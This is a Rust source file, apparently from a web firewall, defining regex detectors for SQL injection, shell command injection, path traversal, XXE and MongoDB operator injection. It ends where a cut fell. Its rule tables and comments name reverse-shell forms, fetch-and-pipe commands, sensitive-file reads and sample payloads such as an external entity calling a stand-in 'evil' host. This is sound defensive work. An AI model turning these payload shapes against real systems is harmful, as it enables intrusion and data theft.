//! Lane 2 production semantic detectors (plan v2.2 §8).
//!
//! P1b shipped the first real detector, [`StructuralSqlDetector`]; **P1c adds two
//! more** — [`RceStructuralDetector`] (shell command injection) and
//! [`TraversalStructuralDetector`] (encoded / obfuscated path traversal). Each is
//! an `OpenRASP`-style **structural / regex half-semantic** detector, deliberately
//! *not* an AST parser (`sqlparser-rs` is P2). Each inspects the
//! normalised (`lower_trunc`) form of each preprocessor [`View`] and returns a
//! context-free [`DetectionFinding`]; the pipeline
//! ([`View::to_signal`](super::preprocess::View::to_signal)) attaches
//! provenance / field / scope / detector-id, so a detector can never forge the
//! provenance that gates hard-veto eligibility (codex A-1).
//!
//! **Shadow only in P1b**: the `SQLi` family ships with `enforcement_mode =
//! log_only`, so a match is at most logged + persisted, never a Block.

use std::borrow::Cow;

use brush_parser::ParserOptions;
use brush_parser::ast as shell_ast;
use brush_parser::word::{self as shell_word, WordPiece, WordPieceWithSource};
use regex::Regex;
use sqlparser::ast::{BinaryOperator, Expr, ObjectName, ObjectNamePart, SetExpr, Statement};
use sqlparser::dialect::GenericDialect;
use sqlparser::parser::Parser;
use tracing::error;

use super::budget::ContentInspectionState;
use super::preprocess::{PreprocessCtx, SemanticDetector, View};
use super::types::{AttackKind, Confidence, DetectionFinding, DetectorId};

/// How a compiled rule decides whether it fired.
enum RuleKind {
    /// Fires when the pattern matches at least once.
    Presence,
    /// Fires when the pattern matches at least this many times (density / frequency).
    Count(usize),
}

/// One compiled structural rule (shared by every structural detector — `SQLi`,
/// `RCE`, `Traversal`).
struct CompiledRule {
    /// Stable matching key (hard-veto allowlist matches on this, never `detail`).
    rule_key: &'static str,
    /// Graded confidence `0..=100` (shadow starting values, pre-holdout
    /// calibration — plan §6.6 / §8.2).
    confidence: u8,
    re: Regex,
    kind: RuleKind,
}

/// One row of a rule table: `(rule_key, confidence, pattern, kind, default_on)`.
///
/// `default_on = false` marks a rule that ships **disabled** by default: a
/// high-noise pattern that requires holdout calibration before it may run in
/// production (plan v2.2). [`compile_table`] compiles only the `default_on`
/// subset unless `all` is set (test-only).
type RuleRow = (&'static str, u8, &'static str, RuleKind, bool);

/// Compile a rule table, keeping either the default-on subset or every row.
///
/// A pattern that fails to compile (a bug — the patterns are constants) is
/// logged and skipped rather than panicking, so a detector degrades to a smaller
/// rule set instead of aborting startup (iron rule: no panic in production).
fn compile_table(table: &[RuleRow], all: bool, who: &str) -> Vec<CompiledRule> {
    let mut rules = Vec::with_capacity(table.len());
    for (rule_key, confidence, pattern, kind, default_on) in table {
        if !all && !*default_on {
            continue;
        }
        match Regex::new(pattern) {
            Ok(re) => rules.push(CompiledRule {
                rule_key,
                confidence: *confidence,
                re,
                kind: match kind {
                    RuleKind::Presence => RuleKind::Presence,
                    RuleKind::Count(n) => RuleKind::Count(*n),
                },
            }),
            Err(e) => error!("{who}: rule '{rule_key}' failed to compile: {e}"),
        }
    }
    rules
}

/// Return the strongest firing rule (highest confidence) over the haystack, or
/// `None` when nothing fired.
fn best_match<'a>(rules: &'a [CompiledRule], hay: &str) -> Option<&'a CompiledRule> {
    let mut best: Option<&CompiledRule> = None;
    for rule in rules {
        let fired = match rule.kind {
            RuleKind::Presence => rule.re.is_match(hay),
            RuleKind::Count(min) => rule.re.find_iter(hay).take(min).count() >= min,
        };
        if fired && best.is_none_or(|b| rule.confidence > b.confidence) {
            best = Some(rule);
        }
    }
    best
}

/// Build a de-identified [`DetectionFinding`] from the winning rule — it names
/// the rule and confidence, and **never** echoes the payload.
fn finding_for(rule: &CompiledRule, attack: AttackKind, family: &str) -> DetectionFinding {
    DetectionFinding {
        attack,
        confidence: Confidence::saturating(rule.confidence),
        rule_key: rule.rule_key,
        detail: std::borrow::Cow::Owned(format!(
            "structural {family} rule '{}' matched (confidence {})",
            rule.rule_key, rule.confidence
        )),
    }
}

/// The rule table (plan §8.2). Patterns run against the **lowercased** normalised
/// view text, so every pattern is authored lowercase. Ordered high→low
/// confidence for readability; `detect` returns the strongest firing rule.
///
/// `(rule_key, confidence, pattern, kind, default_on)`.
///
/// `default_on = false` marks a rule that ships **disabled** by default (plan
/// v2.2: the high-noise stacked / chr / hex / `information_schema` rules require
/// holdout calibration before they may run). [`StructuralSqlDetector::new`]
/// compiles only the `default_on` rules; [`StructuralSqlDetector::with_all_rules`]
/// (test-only) compiles the whole table.
const RULES: &[RuleRow] = &[
    // Exfiltration / file write.
    (
        "sql.into_outfile",
        95,
        r"\binto\s+(outfile|dumpfile)\b",
        RuleKind::Presence,
        true,
    ),
    // Stacked query: a statement separator followed by another statement keyword.
    // DEFAULT-OFF (plan v2.2): fires on prose / code `; select …` with no SQL
    // context; needs holdout calibration before it may run.
    (
        "sql.stacked",
        90,
        r";\s*(select|insert|update|delete|drop|create|alter|union|declare|exec|grant)\b",
        RuleKind::Presence,
        false,
    ),
    // Dangerous functions / time-based blind primitives. The call-paren form
    // (`sleep(`, `benchmark(`, …) or `waitfor delay` is required.
    (
        "sql.dangerous_fn",
        85,
        r"\b(load_file|benchmark|sleep|pg_sleep|updatexml|extractvalue|xp_cmdshell)\s*\(|\bwaitfor\s+delay\b",
        RuleKind::Presence,
        true,
    ),
    // UNION-based with NULL / numeric / comma padding (column-count probing).
    // Requires adjacent `union [all|distinct] select` (SQL context), not just
    // `union … select` separated by arbitrary prose.
    (
        "sql.union_null",
        78,
        r"\bunion\b(?:\s+(?:all|distinct))?\s+select\b.{0,80}?(\bnull\b|,\s*null|,\s*,|\b\d+\s*,\s*\d+)",
        RuleKind::Presence,
        true,
    ),
    // General UNION SELECT — requires adjacent `union [all|distinct] select`.
    (
        "sql.union_select",
        72,
        r"\bunion\b(?:\s+(?:all|distinct))?\s+select\b",
        RuleKind::Presence,
        true,
    ),
    // MySQL version-gated comment `/*!12345 …*/` — requires a digit right after
    // `/*!` (a real version gate), so a plain `/*! license */` banner does not fire.
    ("sql.version_comment", 70, r"/\*!\d", RuleKind::Presence, true),
    // information_schema enumeration. DEFAULT-OFF (plan v2.2); also narrowed to
    // the structural `information_schema.tables|columns` form (a bare
    // `information_schema` field name no longer fires).
    (
        "sql.info_schema",
        65,
        r"\binformation_schema\s*\.\s*(tables|columns)\b",
        RuleKind::Presence,
        false,
    ),
    // chr()/char() obfuscation frequency ≥ 5. DEFAULT-OFF (plan v2.2): code /
    // formulas with repeated `char(` calls false-positive.
    ("sql.chr_freq", 45, r"\b(chr|char)\s*\(", RuleKind::Count(5), false),
    // Hex-literal density ≥ 2. DEFAULT-OFF (plan v2.2): log lines / on-chain data
    // with `0x…` constants false-positive. Token-bounded (`\b`).
    ("sql.hex_const", 40, r"\b0x[0-9a-f]+\b", RuleKind::Count(2), false),
];

/// `OpenRASP`-derived structural `SQLi` detector (plan §8). Registered in the
/// `SQLi` attack family; matches on the normalised view text.
pub struct StructuralSqlDetector {
    rules: Vec<CompiledRule>,
}

impl StructuralSqlDetector {
    /// Compile the **default-on** rules. A pattern that fails to compile (a bug —
    /// the patterns are constants) is logged and skipped rather than panicking, so
    /// the detector degrades to a smaller rule set instead of aborting startup
    /// (iron rule: no panic in production).
    ///
    /// The high-noise stacked / chr / hex / `information_schema` rules are
    /// `default_on = false` (plan v2.2) and are **not** compiled here; they await
    /// holdout calibration before they may run in production.
    #[must_use]
    pub fn new() -> Self {
        Self::compile(false)
    }

    /// Test-only constructor that compiles **every** rule in the table, including
    /// the default-off high-noise rules, so unit tests can exercise them.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self::compile(true)
    }

    /// Compile the rule table, keeping either the default-on subset or all rules.
    #[must_use]
    fn compile(all: bool) -> Self {
        Self {
            rules: compile_table(RULES, all, "StructuralSqlDetector"),
        }
    }
}

impl Default for StructuralSqlDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for StructuralSqlDetector {
    fn id(&self) -> DetectorId {
        DetectorId::StructRule
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::SqlInjection, "SQLi"))
    }
}

// ── RCE (shell command injection) structural detector (plan §8, P1c) ──────────

/// Self-authored shell command-injection rule table (plan §8.3). Patterns run
/// against the **lowercased** normalised view text (authored lowercase). The
/// legacy Lane 1 [`crate::checks::RceCheck`] veto stays frozen and runs first;
/// this additive detector fires on the Lane-2-only decode/normalise views
/// (base64 / hex / html-entity / SQL-comment strip / **shell de-obfuscation**)
/// that Lane 1's raw URL-decode-only path cannot see (fire-drill 2026-07-22).
///
/// Every rule is **context-narrowed** to defeat the classic false positives:
/// a bare `|` / `&` / `sh` / `nc` / `$(` never fires on its own — a command
/// separator must be followed by a real dangerous binary, a command
/// substitution must wrap a real command, `sh`/`bash` require the `-c`/`-i`/`-e`
/// exec form (codex P1b §3.2 discipline).
///
/// `default_on = false` marks the high-noise rules (a bare separator + common
/// command, backtick-wraps-anything) that await holdout calibration.
const RCE_RULES: &[RuleRow] = &[
    // Reverse-shell fingerprints: `/dev/tcp` redirect, `bash -i`, `nc -e/-c`.
    // These are complete reverse-shell structures with very low FP. A bare
    // `mkfifo` is DELIBERATELY NOT here (codex A-4): `mkfifo` is an ordinary POSIX
    // utility that appears in docs / ops tooling, so it must not single-handedly
    // reach confidence 92 — the FIFO reverse-shell form is caught by the
    // default-off `rce.mkfifo_revshell` joint rule below (FIFO + shell/nc).
    (
        "rce.reverse_shell",
        92,
        r"/dev/(tcp|udp)/|\b(ba)?sh\s+-i\b|\bn(c|cat)\s+-[ec]\b|>&\s*/dev/(tcp|udp)",
        RuleKind::Presence,
        true,
    ),
    // Interpreter exec flag: `sh -c` / `bash -c` / `python -c` / `perl -e` /
    // `powershell -enc` — the inline-code-execution idiom.
    (
        "rce.shell_exec_flag",
        82,
        r"\b(sh|bash|zsh|dash|python[0-9.]*|perl|ruby|php|powershell|pwsh)\s+-(c|e|enc|encodedcommand)\b",
        RuleKind::Presence,
        true,
    ),
    // Command substitution wrapping a real command: `$(id)`, `$(cat /etc/passwd)`.
    // Narrowed to the `$(` form ONLY (codex A-4): jQuery `$('#x')` / `$(document)`
    // do not fire (the char after `$(` must lead into a known command, not a
    // quote), and the backtick form — which false-positives on Markdown command
    // spans like `` `curl --help` `` — moved to the default-off `rce.backtick_cmd`.
    (
        "rce.cmd_subst",
        80,
        r"\$\(\s*/?(?:usr/)?(?:bin/)?(id|whoami|uname|cat|ls|wget|curl|nc|ncat|bash|sh|pwd|hostname|ifconfig|env|printenv|nslookup|dig|sleep|ping)\b",
        RuleKind::Presence,
        true,
    ),
    // Pipe into an interpreter: `... | sh`, `curl x | bash`.
    (
        "rce.piped_shell",
        78,
        r"\|\s*(sh|bash|zsh|dash|python[0-9.]*|perl)(\s|$)",
        RuleKind::Presence,
        true,
    ),
    // Separator (`;` `|` `&&` `$(`) followed by a fetch tool WITH an argument:
    // `; wget http://…`, `| curl -o …`. A SINGLE `&` is NOT a separator here
    // (codex A-4): in a query/form/prose `&` is the field separator, so `&curl
    // help` must stay clean; only `&&` counts. A backtick is likewise excluded —
    // a Markdown span `` `curl --help` `` must not fire (the backtick fetch form is
    // covered by the default-off `rce.backtick_cmd`). The trailing `\S` requires a
    // real argument, so `&method=curl&x=1` and a bare `curl` word both stay clean.
    (
        "rce.fetch_exec",
        75,
        r"(?:[;|]|&&|\$\()\s*(wget|curl|certutil|nslookup|tftp)\s+\S",
        RuleKind::Presence,
        true,
    ),
    // Reading a sensitive file via a reader command — the shape a de-obfuscated
    // `cat$IFS/etc/passwd` collapses to after shell normalisation.
    (
        "rce.sensitive_read",
        70,
        r"\b(cat|less|more|head|tail|nl|od|xxd|strings)\s+/?(etc/passwd|etc/shadow|proc/self|proc/version)",
        RuleKind::Presence,
        true,
    ),
    // DEFAULT-OFF (codex A-4, joint structure): a FIFO reverse shell — `mkfifo`
    // followed (within a short window) by a shell / netcat reader, e.g.
    // `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i … | nc …`. Requiring the joint
    // structure keeps a bare `mkfifo` doc/word from firing; ships disabled pending
    // holdout calibration.
    (
        "rce.mkfifo_revshell",
        90,
        r"\bmkfifo\b.{0,60}\b(nc|ncat|sh|bash)\b",
        RuleKind::Presence,
        false,
    ),
    // DEFAULT-OFF (high-noise): a bare separator + a common command. `; ls`,
    // `| cat`, `&& echo` occur in prose / shell snippets / params, so this
    // awaits holdout calibration before running.
    (
        "rce.cmd_sep_common",
        45,
        r"[;|&]\s*(cat|ls|id|rm|cp|mv|chmod|chown|echo|ping|kill|ps|whoami|uname|pwd|dir|type)\b",
        RuleKind::Presence,
        false,
    ),
    // DEFAULT-OFF (codex A-4, high-noise): a backtick wrapping a known command —
    // Markdown command spans (`` `curl --help` ``) false-positive heavily, so the
    // backtick command-substitution form ships disabled pending holdout data. The
    // `$(cmd)` form stays default-on above.
    (
        "rce.backtick_cmd",
        78,
        r"`\s*/?(?:usr/)?(?:bin/)?(id|whoami|uname|cat|ls|wget|curl|nc|ncat|bash|sh|pwd|hostname|ifconfig|env|printenv|nslookup|dig)\b",
        RuleKind::Presence,
        false,
    ),
];

/// Self-authored structural RCE / command-injection detector (plan §8, P1c).
/// Registered in the `RCE` attack family; matches on the normalised view text.
pub struct RceStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl RceStructuralDetector {
    /// Compile the **default-on** rules (the high-noise `cmd_sep_common` /
    /// `backtick_any` rules await holdout calibration and are not compiled).
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(RCE_RULES, false, "RceStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(RCE_RULES, true, "RceStructuralDetector"),
        }
    }
}

impl Default for RceStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for RceStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::Rce
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Rce, "RCE"))
    }
}

// ── Traversal T1 (encoded path traversal) structural detector (plan §8, P1c) ──

/// Encoded / obfuscated path-traversal rule table (plan §8.4, "T1"). **T0** is
/// the frozen Lane 1 [`crate::checks::DirTraversalCheck`] veto (raw `../`,
/// `%2e%2e`, overlong, sensitive absolute paths on the URL-decode-only path);
/// it is unchanged and runs first. This additive **T1** detector re-catches the
/// same structures on the Lane-2-only decode views (base64 / hex / html-entity /
/// shell-normalised) — a traversal wrapped in base64, or split by quotes so the
/// `/etc/passwd` literal never appears raw, is invisible to Lane 1 but surfaces
/// here after the semantic preprocessor decodes it.
///
/// The plain-`../` rule is **default-off**: relative paths / JS imports
/// (`import x from '../util'`) make a bare `../` far too noisy to run by default
/// (P1b FP discipline). The encoded / overlong / sensitive-absolute rules are
/// default-on: those forms are almost never legitimate.
const TRAVERSAL_RULES: &[RuleRow] = &[
    // Overlong / invalid-UTF-8 encodings of `../` — always malicious.
    (
        "traversal.overlong",
        82,
        r"\.\.(%c0%af|%c1%9c|%e0%80%af)|%c0%ae%c0%ae|%c0%2e%c0%2e",
        RuleKind::Presence,
        true,
    ),
    // Percent-encoded dot-dot: `%2e%2e/`, `..%2f`, `..%5c`, double-encoded
    // `%252e%252e/`. Every alternative requires a following path separator (codex
    // A-4 must-fix): a bare `%252e%252e` (or `%2e%2e`) is only an encoded `..`
    // (as in a filename `photo%252e%252ejpg`, or a triple encoded dot
    // `%252e%252e%252e` with no separator at all) and is NOT traversal on its
    // own. A further encoded *dot* (`%2e` / `%252e`) is NOT a separator and is
    // deliberately excluded from the following-character set (the earlier
    // must-fix bug: it let an unbounded run of encoded dots fire without ever
    // requiring a `/` or `\`).
    //   * single-encoded `%2e%2e` must be followed by a REAL separator: raw
    //     `/`/`\` or single-encoded `%2f`/`%5c`;
    //   * double-encoded `%252e%252e` must be followed by either the fully
    //     double-encoded separator `%252f`/`%255c`, or a mixed-depth single
    //     separator (`%2f`/`%5c`/`/`/`\`) — mixed-encoding-depth traversal is a
    //     real bypass vector seen in the wild and is intentionally kept.
    // Encoded traversal with a genuine separator is essentially never
    // legitimate traffic.
    (
        "traversal.encoded_dotdot",
        75,
        r"%2e%2e(%2f|%5c|/|\\)|%252e%252e(%252f|%255c|%2f|%5c|/|\\)|\.\.%2f|\.\.%5c|%2e%2e%2f",
        RuleKind::Presence,
        true,
    ),
    // Sensitive absolute path revealed after decoding (base64/hex/normalise).
    // Kept to a TIGHT, unambiguous list (codex A-4) — only paths that are almost
    // never legitimate to request: `/etc/passwd`, `/etc/shadow`, SSH keys, Windows
    // system32 / win.ini / boot.ini. High-frequency legitimate ops/container paths
    // (`/etc/hosts`, `/proc/self`, `/proc/version`) are NOT here — they moved to
    // the default-off `traversal.sensitive_abs_ops` rule so ordinary ops traffic
    // does not trip a shadow event.
    (
        "traversal.sensitive_abs",
        68,
        r"/etc/(passwd|shadow)\b|/root/\.ssh/|(/|\\)windows(/|\\)(system32|win\.ini)|\bboot\.ini\b",
        RuleKind::Presence,
        true,
    ),
    // DEFAULT-OFF (codex A-4): high-frequency legitimate absolute paths that are
    // only weak traversal evidence on their own — `/etc/hosts`, `/proc/self`,
    // `/proc/<pid>/`. A reader command in front of them still fires the default-on
    // `rce.sensitive_read` rule; this bare-path form awaits holdout calibration.
    (
        "traversal.sensitive_abs_ops",
        55,
        r"/etc/hosts\b|/proc/self\b|/proc/version\b|/proc/[0-9]+/",
        RuleKind::Presence,
        false,
    ),
    // DEFAULT-OFF (high-noise): a plain decoded `../` / `..\`. Also catches the
    // `....//` double-write bypass (it contains `../` as a substring). Relative
    // imports / paths make this too noisy to run before holdout calibration.
    ("traversal.plain_dotdot", 50, r"\.\.[/\\]", RuleKind::Presence, false),
];

/// Encoded path-traversal (T1) structural detector (plan §8, P1c). Registered in
/// the `Traversal` attack family; matches on the normalised view text.
pub struct TraversalStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl TraversalStructuralDetector {
    /// Compile the **default-on** rules (the noisy plain-`../` rule awaits
    /// holdout calibration and is not compiled).
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(TRAVERSAL_RULES, false, "TraversalStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off plain-`../`.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(TRAVERSAL_RULES, true, "TraversalStructuralDetector"),
        }
    }
}

impl Default for TraversalStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for TraversalStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::Traversal
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Traversal, "Traversal"))
    }
}

// ── XXE (XML external entity) structural detector (plan §T2-A) ────────────────

/// XXE structural rule table (plan T2-A). Matches the DTD / prolog structures
/// that mark an XML-external-entity attack on the **normalised view text** — the
/// same `lower_trunc` surface every other structural detector uses.
///
/// **No XML parser is invoked.** The XXE-relevant grammar (`<!DOCTYPE>` /
/// `<!ENTITY>` / `SYSTEM` / `PUBLIC` / parameter entities `%name;`) lives entirely
/// in the DTD/prolog and is a set of textual markers a regex matches precisely;
/// a full parse buys nothing here (`quick-xml`, the tree's XML reader used by Lane
/// B field extraction, is a non-validating pull parser that never expands the
/// internal subset anyway — it would hand back the raw DOCTYPE text to be scanned
/// exactly like this). Crucially, *not* parsing removes the entire parse-time `DoS`
/// surface the red-line calls out (billion-laughs entity expansion / deep element
/// nesting / oversized entities): there is no expansion step to weaponise. The
/// input the detector sees is already length- and token-bounded by the
/// preprocessor (`max_field_input_bytes`, `MAX_TOKEN_LEN`, `max_tokens`), so every
/// rule is a bounded linear scan; the billion-laughs indicator is a bounded
/// frequency **count** ([`RuleKind::Count`]) of entity declarations, never an
/// expansion.
///
/// FP discipline mirrors the other families: the strong, essentially-never-benign
/// structures (external entity declaration, parameter-entity definition) ship
/// **default-on**; the noisy structures that also occur in legitimate XML
/// (external `<!DOCTYPE … PUBLIC "…//DTD…" "http://…">` as used by every XHTML
/// page, a bare `%name;` reference, a handful of internal entity declarations)
/// ship **default-off** and await holdout calibration.
///
/// `(rule_key, confidence, pattern, kind, default_on)`.
const XXE_RULES: &[RuleRow] = &[
    // External entity declaration: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` or
    // the OOB parameter form `<!ENTITY % xxe SYSTEM "http://evil/x">`. A named
    // entity resolved from an external `SYSTEM`/`PUBLIC` identifier is the classic
    // XXE primitive and is essentially never present in legitimate request data.
    // DEFAULT-ON, high confidence.
    (
        "xxe.entity_external",
        90,
        r"<!entity\s+(%\s+)?\S+\s+(system|public)\b",
        RuleKind::Presence,
        true,
    ),
    // Parameter-entity DEFINITION: `<!ENTITY % name …>`. Parameter entities are a
    // DTD-authoring construct that drives blind / out-of-band XXE and the
    // parameter-entity billion-laughs variant; they essentially never appear in
    // benign request bodies. Catches the INTERNAL form too (no external id), which
    // `entity_external` does not. DEFAULT-ON.
    (
        "xxe.param_entity_def",
        80,
        r"<!entity\s+%\s+\S",
        RuleKind::Presence,
        true,
    ),
    // External DOCTYPE: `<!DOCTYPE root SYSTEM "…">` / `<!DOCTYPE root PUBLIC "…"
    // "…">`. Weaker signal — a legitimate XHTML page ships
    // `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://www.w3.org/…">`,
    // so the `PUBLIC` form is genuinely benign on HTML-ish traffic. DEFAULT-OFF
    // pending holdout calibration; the HTML5 `<!DOCTYPE html>` (no external id)
    // never matches this rule regardless.
    (
        "xxe.doctype_external",
        60,
        r"<!doctype\s+\S+\s+(system|public)\b",
        RuleKind::Presence,
        false,
    ),
    // Bare parameter-entity REFERENCE `%name;` (letter-initial name). Strong when
    // paired with a definition, but noisy alone — stray text / encoded fragments
    // can incidentally produce `%word;`. DEFAULT-OFF pending calibration.
    (
        "xxe.param_entity_ref",
        55,
        r"%[a-z_][a-z0-9_.:-]*;",
        RuleKind::Presence,
        false,
    ),
    // Internal-entity expansion (billion-laughs family): several `<!ENTITY …>`
    // declarations in one document. A bounded frequency COUNT — the linear,
    // parse-free billion-laughs indicator (each declaration is counted, nothing is
    // expanded). DEFAULT-OFF: a legitimate DTD may declare a few entities, so this
    // needs holdout calibration before it runs. Note the external / parameter
    // variants are already caught default-on above; this catches the purely
    // internal `<!ENTITY lolN "&lolM;…">` recursion.
    ("xxe.entity_expansion", 65, r"<!entity\b", RuleKind::Count(3), false),
];

/// Structural XXE (XML external entity) detector (plan T2-A).
///
/// Registered in the `Xxe` attack family; matches on the normalised view text.
/// Single-detector family — no corroboration partner — so FP control is by narrow
/// default-on rules + default-off high-noise rules, per the plan §四.3 invariant.
pub struct XxeStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl XxeStructuralDetector {
    /// Compile the **default-on** rules (external entity / parameter-entity
    /// definition). The noisy external-DOCTYPE, bare-`%name;` and internal-entity
    /// -expansion rules await holdout calibration and are not compiled.
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(XXE_RULES, false, "XxeStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(XXE_RULES, true, "XxeStructuralDetector"),
        }
    }
}

impl Default for XxeStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for XxeStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::XxeStruct
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Xxe, "XXE"))
    }
}

// ── NoSQL (MongoDB operator) structural detector (plan §T2-B) ─────────────────

/// `NoSQL` operator rule table (plan T2-B). Each rule matches a set of `MongoDB`
/// query operators, **anchored to the whole normalised view** (`^\$op$`). This is
/// deliberate: the detector consumes the `$`-prefixed JSON **object keys** that
/// [`super::struct_extract::extract_body_fields`] surfaces as their own single-token
/// leaves (label [`super::struct_extract::NOSQL_OP_LABEL`]) — a `MongoDB` operator
/// injection lives in the key (`{"pw":{"$ne":null}}`), never a string value. Because
/// each operator arrives as its own leaf whose entire normalised text is the operator,
/// anchoring gives a precise "this key IS an operator" match with no substring noise:
/// a string value that merely contains `$ne` in prose is a different leaf and never
/// anchor-matches.
///
/// The signal is honestly weak for a reverse proxy — a pure proxy cannot know the
/// backend is `MongoDB`, and comparison operators (`$ne` / `$gt` …) recur in perfectly
/// legitimate JSON query APIs — so this is the family's whole FP story (plan §四.3,
/// single-detector families narrow with default-off high-noise rules):
///   * **DEFAULT-ON, high confidence** — only the operators that execute
///     server-side JavaScript (`$where` / `$function` / `$accumulator`). A
///     legitimate client-facing JSON API essentially never lets the *user* place
///     one of these in a query, so a user-controlled occurrence is strong evidence.
///   * **DEFAULT-OFF** — `$expr`, the comparison, `$regex` and logical operators,
///     which a benign filter API uses constantly. `$expr` evaluates an aggregation
///     expression but does **not** run arbitrary server-side JS, and is a common,
///     legitimate `MongoDB` operator, so it is not default-on evidence; it ships
///     disabled pending holdout calibration alongside the comparison / regex /
///     logical operators. A single one alone is not worth even a shadow log.
///
/// It runs no query engine and adds no parse surface: the operators are already
/// isolated leaves bounded by the JSON walk's depth / node / field budgets, so every
/// rule is an anchored linear match. `(rule_key, confidence, pattern, kind, default_on)`.
const NOSQL_RULES: &[RuleRow] = &[
    // Server-side JavaScript execution operators. `$where` / `$function` /
    // `$accumulator` run attacker-supplied JavaScript in the query engine — a
    // user-controlled occurrence is a near-unambiguous injection, so this is the
    // only DEFAULT-ON rule. `$expr` is intentionally NOT here: it evaluates an
    // aggregation expression but does not run arbitrary JS and is a common,
    // legitimate operator, so it ships DEFAULT-OFF (`nosql.expr_operator` below).
    (
        "nosql.query_operator",
        90,
        r"^\$(where|function|accumulator)$",
        RuleKind::Presence,
        true,
    ),
    // `$expr`: evaluates an aggregation expression inside a query filter. Unlike the
    // JS operators above it does NOT execute arbitrary server-side JavaScript, and
    // it is a common, legitimate MongoDB operator (`{"$match":{"$expr":…}}`), so it
    // is DEFAULT-OFF pending holdout calibration rather than default-on evidence.
    ("nosql.expr_operator", 75, r"^\$expr$", RuleKind::Presence, false),
    // `$regex`: attacker-supplied regex → ReDoS / auth-filter bypass. Real APIs do
    // expose regex search, so DEFAULT-OFF pending calibration.
    ("nosql.regex_operator", 60, r"^\$regex$", RuleKind::Presence, false),
    // Comparison operators — the classic `{"pw":{"$ne":null}}` auth bypass, but also
    // the bread-and-butter of every legitimate filter API. DEFAULT-OFF: far too
    // noisy to fire (even to Log) on its own before holdout calibration.
    (
        "nosql.comparison_operator",
        55,
        r"^\$(ne|gt|gte|lt|lte|in|nin)$",
        RuleKind::Presence,
        false,
    ),
    // Logical combinators. Ubiquitous in benign queries; DEFAULT-OFF.
    (
        "nosql.logical_operator",
        45,
        r"^\$(or|and|nor)$",
        RuleKind::Presence,
        false,
    ),
];

/// Extraction allowlist: every `$`-prefixed `MongoDB` operator key that any
/// [`NOSQL_RULES`] rule can match — the **default-off rules included**.
///
/// The body field-extractor ([`super::struct_extract::extract_body_fields`]) surfaces
/// a `$`-prefixed JSON object key as an operator leaf **only** when it is in this
/// list, so a non-operator `$`-key (`$schema` / `$ref` / `$id`, or attacker padding
/// like `$k000`) neither reaches any detector nor consumes a field-budget slot that
/// a real deep attack value needs (the F1 budget-starvation regression). Compared
/// case-insensitively — the detector view is lowercased before matching, so this
/// mirrors that.
///
/// This MUST stay a superset of every operator in `NOSQL_RULES`, including the
/// default-off rules: an operator that a rule matches but the extractor does not
/// surface is invisible the moment that rule is enabled. The
/// `nosql_operator_allowlist_matches_rule_operators` test guards the invariant.
pub(super) const NOSQL_OPERATOR_KEYS: &[&str] = &[
    // JS execution (default-on) + `$expr` (default-off).
    "$where",
    "$function",
    "$accumulator",
    "$expr",
    // regex (default-off).
    "$regex",
    // comparison (default-off).
    "$ne",
    "$gt",
    "$gte",
    "$lt",
    "$lte",
    "$in",
    "$nin",
    // logical (default-off).
    "$or",
    "$and",
    "$nor",
];

/// Structural `NoSQL` (`MongoDB` operator) detector (plan T2-B).
///
/// Registered in the `NoSqlInjection` attack family; a single-detector family, so FP
/// control is by a narrow default-on rule (JS/expression operators only) plus
/// default-off high-noise rules, per the plan §四.3 invariant. It inspects the
/// normalised view text of the `$`-key leaves surfaced by
/// [`super::struct_extract`]; it never parses or evaluates a query.
pub struct NoSqlStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl NoSqlStructuralDetector {
    /// Compile the **default-on** rules (JS/expression operators only). The noisy
    /// comparison / `$regex` / logical rules await holdout calibration and are not
    /// compiled.
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(NOSQL_RULES, false, "NoSqlStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(NOSQL_RULES, true, "NoSqlStructuralDetector"),
        }
    }
}

impl Default for NoSqlStructuralDetector {
    fn default() -> Self {
